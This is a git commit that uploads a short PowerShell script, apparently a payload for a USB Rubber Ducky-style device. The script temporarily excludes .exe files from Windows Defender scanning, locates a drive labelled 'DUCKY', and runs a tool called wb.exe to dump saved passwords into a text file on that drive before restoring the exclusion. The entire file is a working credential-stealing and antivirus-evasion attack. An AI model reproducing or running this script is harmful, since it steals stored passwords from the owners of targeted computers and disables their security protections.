1ec600eab74c128f50ed095528de68abfa036144
samael14 <61826527+samael14@users.noreply.github.com>
2022-09-11 15:31:57 +0200

    Add files via upload

---
+++ Get_pss_wd.ps1
@@ -0,0 +1,6 @@
+﻿Add-MpPreference -ExclusionExtension exe -Force
+$destinationLabel = "DUCKY"
+$destinationLetter = Get-WmiObject -Class Win32_Volume | where {$_.Label -eq $destinationLabel} | select -expand name
+cd $destinationLetter
+.\wb.exe /stext passtest.txt
+remove-MpPreference -ExclusionExtension exe -Force
